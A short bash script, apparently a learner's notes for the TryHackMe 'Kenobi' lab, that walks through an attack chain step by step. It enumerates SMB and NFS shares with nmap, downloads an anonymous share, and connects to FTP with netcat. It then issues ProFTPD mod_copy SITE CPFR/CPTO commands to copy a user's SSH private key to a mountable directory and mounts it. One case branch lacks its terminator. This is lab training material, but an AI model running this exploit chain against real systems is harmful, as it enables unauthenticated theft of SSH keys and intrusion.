#!/bin/bash

# URL to to attack
MACHINE_IP=xxx.xxx.xxx

case "$1" in
  # Using nmap to enumerate SMB shares
  1)
    nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $MACHINE_IP
    ;;
  # Inspect shares
  2)
    smbclient //$MACHINE_IP/anonymous
    ;;
  # Recursively download the SMB sshare 
  3)
    smbget -R smb://$MACHINE_IP/anonymous
    ;;
  # Service rpcbind (conver rpc to universal address) - port 111 access to network file system
  4)
    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $MACHINE_IP
    ;;
  # Use netcat to FTP port
  5)
    nc $MACHINE_IP 21
    ;;
  # Search for exploits in explot-db.com
  6)
    echo "Found exploit to copy files in any location without need to be authenticated"
    ;;
  # After initiating netcat
  7)
    echo "SITE CPFR /home/kenobi/.ssh/id_rsa"
    echo "SITE CPTO /var/tmp/id_rsa"
    ;;
  # Mount the /var/tmp directory to our machine
  8)
    mkdir /mnt/kenobiNFS
    mount $MACHINE_IP:/var /workspaces/hacking/tryHackMe/kenobi
  *)
    echo "WIP - Only steps from 1 to 8"
    ;;
esac
